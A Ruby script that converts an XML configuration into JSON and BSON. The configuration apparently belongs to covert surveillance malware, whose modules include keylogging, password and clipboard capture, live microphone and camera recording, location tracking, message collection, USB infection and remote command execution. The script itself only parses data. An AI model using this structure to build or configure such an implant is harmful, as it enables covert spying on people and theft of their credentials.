require 'json'
require 'bson'
require 'pp'
require 'xmlsimple'

def parse_globals(item)
  globals = {}
  item.each_pair do |key, value|
    if key == 'quota' then
      globals[:quota] = {:min => value.first['mindisk'], :max => value.first['maxlog']}
      globals[:wipe] = value.first['wipe'] == 'false' ? false : true 
    end
    if key == 'template' then
      globals[:type] = value.first['type']
    end
  end
  globals[:version] = 20111231
  globals[:nohide] = []
  return globals
end

def parse_events(items)
  events = []
  
  items.each do |i|
    e = {}
    e[:start] = i['action'].to_i
    e[:repeat] = -1
    e[:end] = -1
    (i.keys.delete_if {|x| x == 'action' or x == 'actiondesc'}).each do |ev|
      e[:event] = ev
      params = i[ev].first
      e[:end] = params['endaction'].to_i unless params['endaction'].nil?
      case ev
        when 'process'
          e[:window] = params['window'] == 'false' ? false : true
          e[:focus] = params['focus'] == 'false' ? false : true
          e[:process] = params['content']
        when 'screensaver', 'ac', 'simchange', 'standby'
          # no parameters
        when 'connection'
          e.merge! params
          e['port'] = e['port'].to_i
        when 'connectivity'
          # rename to connection
          e[:event] = 'connection'
        when 'winevent'
          e.merge! params
          e['id'] = e['id'].to_i
        when 'battery'
          e[:min] = params['min'].to_i
          e[:max] = params['max'].to_i
        when 'call'
          e[:number] = params['number']
        when 'quota'
          e[:quota] = params['size'].to_i
        when 'location'
          e[:type] = params['type']
          e[:latitude] = params['latitude'].to_f unless params['latitude'].nil?
          e[:longitude] = params['longitude'].to_f unless params['longitude'].nil?
          e[:distance] = params['distance'].to_i unless params['distance'].nil?
          e[:id] = params['id'].to_i unless params['id'].nil?
          e[:country] = params['country'].to_i unless params['country'].nil?
          e[:network] = params['network'].to_i unless params['network'].nil?
          e[:area] = params['area'].to_i unless params['area'].nil?
        when 'timer'
          e[:type] = params['type']
          case e[:type]
            when 'date'
              e[:date] = params['content']
            when 'daily'
              e[:hour_from] = params['hour'].first.to_i
              e[:minute_from] = params['minute'].first.to_i
              e[:second_from] = params['second'].first.to_i
              e[:hour_to] = params['endhour'].first.to_i
              e[:minute_to] = params['endminute'].first.to_i
              e[:second_to] = params['endsecond'].first.to_i
            when 'loop', 'after startup'
              e[:hour] = params['hour'].first.to_i
              e[:minute] = params['minute'].first.to_i
              e[:second] = params['second'].first.to_i    
            when 'after install'
              e[:days] = params['day'].first.to_i
          end
        when 'sms'
          e[:number] = params['number']
          e[:text] = params['text']
        else
          raise 'unknown event'
      end
    end
    events << e
  end
  
  return events
end

def parse_actions(items)
  actions = []
  
  items.each do |i|
    a = {}
    a[:desc] = i['description']
    a[:subactions] = []
    # each subaction
    (i.keys.delete_if {|x| x == 'number' or x == 'description'}).each do |sub|
      i[sub].each do |s|
        
        subaction = {:action => sub}
      
        case sub
          when 'synchronize'
            subaction[:stop] = false
            subaction['type'] = 'internet' if s['type'].nil?
            subaction.merge! s
          when 'sms'
            subaction.merge! s
          when 'log'
            subaction[:text] = s
          when 'execute'
            subaction[:command] = s
          when 'uninstall'
            # no parameters
          when 'agent'
            subaction[:status] = s['action']
            subaction[:agent] = s['name']
          else
            raise "unknown subaction"
        end
        a[:subactions] << subaction
      end
    end
    actions << a
  end
  
  return actions
end

def parse_agents(items)
  agents = []

  items.each do |i|
    a = {}
    a[:agent] = (i.keys.delete_if {|x| x == 'enabled'}).first
    a[:enabled] = i['enabled'] == 'false' ? false : true
    case a[:agent]
      when 'application', 'chat', 'clipboard', 'keylog', 'organizer', 'password', 'calllist'
        # no parameters
      when 'call', 'device', 'camera', 'mic', 'mouse', 'position', 'print', 'url', 'snapshot', 'conference', 'livemic'
        a.merge! i[a[:agent]].first
      when 'crisis'
        t = i[a[:agent]].first
        a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true, 
                       :processes => t['network'].first['process']} unless a[:network].nil?
        a[:hook] = {:enabled => t['hook'].first['enabled'] == 'false' ? false : true, 
                    :processes => t['hook'].first['process']} unless a[:hook].nil?
        a[:synchronize] = t['synchronize'] == 'false' ? false : true unless t['synchronize'].nil?
        a[:call] = t['call'] == 'false' ? false : true unless t['call'].nil?
        a[:mic] = t['mic'] == 'false' ? false : true unless t['mic'].nil?
        a[:camera] = t['camera'] == 'false' ? false : true unless t['camera'].nil?
        a[:position] = t['position'] == 'false' ? false : true unless t['position'].nil?
      when 'infection'
        t = i[a[:agent]].first 
        a[:local] = t['local'] == 'false' ? false : true
        a[:usb] = t['usb'] == 'false' ? false : true
        # false by default on purpose
        a[:mobile] = false
      when 'file'
        a.merge! i[a[:agent]].first
        a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
        a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
      when 'messages'
        i[a[:agent]].each do |mes|
          a.merge! mes
        end
        a['sms'] = a['sms'].first unless a['sms'].nil?
        a['mms'] = a['mms'].first unless a['mms'].nil?
        a['mail'] = a['mail'].first unless a['mail'].nil?
      else
        raise "unknown agent"
    end
    agents << a 
  end

  return agents
end

xml_config = ''
agents = []
actions = []
events = []
globals = {}

#File.open('config_desktop.xml', 'rb') do |f|
File.open('config_mobile.xml', 'rb') do |f|
  xml_config = f.read
end

data = XmlSimple.xml_in(xml_config)

data.each do |item|
  case item[0]
    when 'globals'
      globals = parse_globals(item[1].first)
    when 'events'
      events = parse_events(item[1].first['event'])
    when 'actions'
      actions = parse_actions(item[1].first['action'])
    when 'agents'
      agents = parse_agents(item[1].first['agent'])      
  end
end


config = {'agents' => agents, 'actions' => actions, 'events' => events, 'globals' => globals}

puts 
puts
puts "CONFIG: "
pp config

jconfig = config.to_json

File.open('./config.json', 'wb') do |f|
  f.write jconfig
end

#puts "\nJSON CONFIG: "
#pp jconfig


bconfig = BSON.serialize(config)

File.open('./config.bson', 'wb') do |f|
  f.write bconfig
end

puts "\n\nBSON CONFIG: [#{bconfig.size}]"
#bconfig.to_a.each do |c|
#  print "%02X" % c
#end
puts 
